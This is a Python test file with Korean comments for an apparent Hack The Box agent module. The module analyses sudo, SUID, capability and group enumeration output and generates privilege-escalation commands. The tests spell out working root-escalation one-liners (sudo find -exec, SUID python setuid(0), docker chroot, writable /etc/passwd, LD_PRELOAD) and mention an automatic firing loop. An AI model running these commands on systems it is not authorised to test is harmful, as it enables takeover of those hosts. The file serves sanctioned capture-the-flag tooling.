# 실행: htb-agent 디렉토리에서  python3 tests/test_privesc_analyze.py
#
# ③ 권한상승 폐루프 — 열거 출력 분석 → 벡터 랭킹 → 상승 계획 생성(생성 전용).
# 파싱·랭킹·제안 문자열 생성만(실행 없음). 폐루프의 '후보 선정' 단계.
import sys
sys.path.insert(0, "src")
from htb_agent.privesc_analyze import (                               # noqa: E402
    PrivescVector, analyze_capabilities, analyze_enum, analyze_sudo, analyze_suid,
    render_vectors)

passed = failed = 0
def check(name, cond):
    global passed, failed
    if cond: passed += 1; print(f"  ✅ {name}")
    else:    failed += 1; print(f"  ❌ {name}")

print("=== analyze_sudo ===")
SUDO = """Matching Defaults entries for user on host:
    env_reset, mail_badpass

User user may run the following commands on host:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/less
"""
v = analyze_sudo(SUDO)
kinds = {x.binary: x for x in v}
check("find 벡터 식별", "find" in kinds and kinds["find"].kind == "sudo")
check("find 상승 계획(GTFOBins)", "find" in kinds["find"].plan and "/bin/sh" in kinds["find"].plan)
check("NOPASSWD → 확신도 high", kinds["find"].confidence == "high")
check("less 벡터도 식별", "less" in kinds)
check("빈 입력 안전", analyze_sudo("") == [])

ALL_SUDO = "User x may run the following commands:\n    (ALL : ALL) ALL\n"
va = analyze_sudo(ALL_SUDO)
check("(ALL : ALL) ALL → sudo-all 최상위", any(x.kind == "sudo-all" for x in va))
check("sudo-all 계획 sudo -i", any("sudo -i" in x.plan for x in va))

print("\n=== analyze_suid ===")
SUID = """/usr/bin/sudo
/usr/bin/passwd
/usr/bin/find
/usr/bin/python3.8
/home/user/custombin
"""
s = analyze_suid(SUID)
sk = {x.binary: x for x in s}
check("SUID find 식별", "find" in sk and sk["find"].kind == "suid")
check("SUID find -p 보존 셸 계획", "-p" in sk["find"].plan)
check("표준 SUID(sudo/passwd) 제외", "sudo" not in sk and "passwd" not in sk)
check("매핑 없는 custombin 은 조용히 스킵", "custombin" not in sk)
check("빈 입력 안전", analyze_suid("") == [])

print("\n=== analyze_capabilities ===")
CAPS = """/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
"""
c = analyze_capabilities(CAPS)
ck = {x.binary: x for x in c}
check("cap_setuid python 식별", any("python" in x.binary for x in c))
check("python cap 계획 setuid(0)", any("setuid(0)" in x.plan for x in c))
check("cap_net_raw(ping) 는 setuid 아님 → 제외", not any("ping" in x.binary for x in c))
check("빈 입력 안전", analyze_capabilities("") == [])

print("\n=== analyze_enum (통합·랭킹) + render ===")
COMBINED = SUDO + "\n" + SUID + "\n" + CAPS
allv = analyze_enum(COMBINED)
check("여러 소스 벡터 통합", len(allv) >= 3)
check("확신도순 정렬(high 먼저)", allv[0].confidence == "high")
check("중복 제거(find sudo/suid 분리 유지)",
      len([x for x in allv if x.binary == "find"]) == 2)  # sudo+suid 는 다른 kind
r = render_vectors(allv)
check("render 에 제안 명령(↳) 포함", "↳" in r)
check("벡터 없으면 안내 문구", "후보 없음" in render_vectors([]))

print("\n=== one-shot 비대화형 플랜(TTY 없는 SSH 용) ===")
# sudo find NOPASSWD → 대화형 /bin/sh 스폰 대신, payload 를 바로 root 로 실행
sv = analyze_sudo("    (root) NOPASSWD: /usr/bin/find\n")[0]
check("sudo find one-shot(id) 비대화형",
      sv.oneshot("id") == "sudo find . -maxdepth 0 -exec id \\;")
check("sudo find one-shot 루트 플래그 직독",
      sv.oneshot("cat /root/root.txt") == "sudo find . -maxdepth 0 -exec cat /root/root.txt \\;")
check("one-shot 에 대화형 /bin/sh 스폰 없음", "/bin/sh" not in sv.oneshot("id"))
# SUID python → setuid(0) 후 payload
pv = analyze_suid("/usr/bin/python3.8\n")[0] if analyze_suid("/usr/bin/python3.8\n") else None
check("SUID python one-shot setuid(0)+payload",
      pv is not None and "setuid(0)" in pv.oneshot("id") and "/usr/bin/python3.8" in pv.oneshot("id"))
# capability python → cap 템플릿
cv = analyze_capabilities("/usr/bin/python3.8 = cap_setuid+ep\n")[0]
check("cap python one-shot setuid(0)", "setuid(0)" in cv.oneshot("id"))
# sudo-all → payload 를 바로 sudo
av = [x for x in analyze_sudo("(ALL : ALL) ALL\n") if x.kind == "sudo-all"][0]
check("sudo-all one-shot 'sudo id'", av.oneshot("id") == "sudo id")
# 템플릿 없는 벡터는 빈 문자열(폴백은 호출측 몫)
check("템플릿 없으면 one-shot 빈 문자열",
      PrivescVector("sudo", "nosuchbin").oneshot("id") == "")
check("기본 payload=id", PrivescVector("sudo", "find", path="/usr/bin/find",
      oneshot_tmpl="sudo find . -maxdepth 0 -exec {payload} \\;").oneshot()
      == "sudo find . -maxdepth 0 -exec id \\;")
# render 에 비대화형 라인 노출
check("render 에 비대화형(one-shot) 노출",
      "비대화형(one-shot)" in render_vectors(analyze_enum("    (root) NOPASSWD: /usr/bin/find\n")))

print("\n=== analyze_extra: 비-GTFOBins 표준 벡터 탐지 ===")
import htb_agent.privesc_analyze as pa  # noqa: E402
_dk = pa.analyze_extra("uid=1000(user) gid=1000(user) groups=1000(user),998(docker)")
check("docker 그룹 → high + one-shot(자동 발사 가능)",
      any(v.kind == "docker-group" and v.confidence == "high" and v.oneshot("id") for v in _dk))
check("docker one-shot 에 chroot /mnt",
      any("chroot /mnt" in v.oneshot("id") for v in _dk if v.kind == "docker-group"))
_lx = pa.analyze_extra("groups=1000(user),116(lxd)")
check("lxd 그룹 → 제안(med, 자동 발사 안 함)",
      any(v.kind == "lxd-group" and v.confidence == "med" and not v.oneshot("id") for v in _lx))
_nfs = pa.analyze_extra("/srv *(rw,sync,no_root_squash)")
check("NFS no_root_squash → 제안", any(v.kind == "nfs" for v in _nfs))
_ld = pa.analyze_extra("env_keep+=LD_PRELOAD\n(root) NOPASSWD: /usr/bin/foo")
check("sudo env_keep LD_PRELOAD → 제안", any(v.kind == "ld-preload" for v in _ld))
_pw = pa.analyze_extra("/etc/passwd\n")   # find -writable 출력(단독 경로)
check("writable /etc/passwd → 제안", any(v.kind == "writable-passwd" for v in _pw))
check("평범한 유저(그룹·설정 신호 없음) → 추가 벡터 없음",
      not pa.analyze_extra("uid=1000(user) gid=1000(user) groups=1000(user)"))
check("analyze_enum 이 extra 를 포함(docker 합산)",
      any(v.kind == "docker-group" for v in pa.analyze_enum(
          "groups=1000(user),998(docker)")))

print("\n=== one-shot 유무(자동 발사 루프 필터 정합) ===")
# 대화형 전용(_ONESHOT 없음) 고신뢰 벡터는 oneshot('id')가 비어 자동 루프에서 제외돼야 한다.
_less = [v for v in pa.analyze_sudo("User x may run: (root) NOPASSWD: /usr/bin/less")]
check("sudo less = high 이지만 one-shot 없음(자동 발사 제외 대상)",
      any(v.binary == "less" and v.confidence == "high" and not v.oneshot("id") for v in _less))
_find = [v for v in pa.analyze_sudo("(root) NOPASSWD: /usr/bin/find")]
check("sudo find = one-shot 있음(자동 발사 대상)",
      any(v.binary == "find" and v.oneshot("id") for v in _find))

print("\n=== 생성 전용 경계(불변) 자기점검 ===")
for mod in ("subprocess", "socket", "os", "requests", "urllib", "shutil", "pty"):
    check(f"실행/네트워크 모듈 미임포트: {mod!r}", not hasattr(pa, mod))

print(f"\n결과: {passed} passed, {failed} failed")
sys.exit(1 if failed else 0)
